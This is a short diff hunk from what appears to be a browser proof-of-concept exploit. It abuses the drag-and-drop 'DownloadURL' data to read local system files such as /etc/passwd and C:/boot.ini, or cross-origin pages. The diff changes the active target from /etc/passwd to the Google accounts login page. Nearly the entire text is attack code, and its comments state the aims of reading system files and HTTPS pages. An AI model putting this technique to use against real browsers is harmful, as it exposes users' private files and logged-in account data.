@@ -35,9 +35,9 @@ dragElement.ondragstart = function(e) {
   // Linux: Read /etc/passwd
   // Cross-origin: Read HTTPS pages
 
-  var targetFile = "file:///etc/passwd"; // Linux
+  //var targetFile = "file:///etc/passwd"; // Linux
   // var targetFile = "file:///C:/boot.ini"; // Windows
-  // var targetFile = "https://accounts.google.com/"; // Cross-origin
+  var targetFile = "https://accounts.google.com/"; // Cross-origin
 
   e.dataTransfer.setData("DownloadURL", "application/octet-stream:target.txt:" + targetFile);
   e.dataTransfer.effectAllowed = "copy";
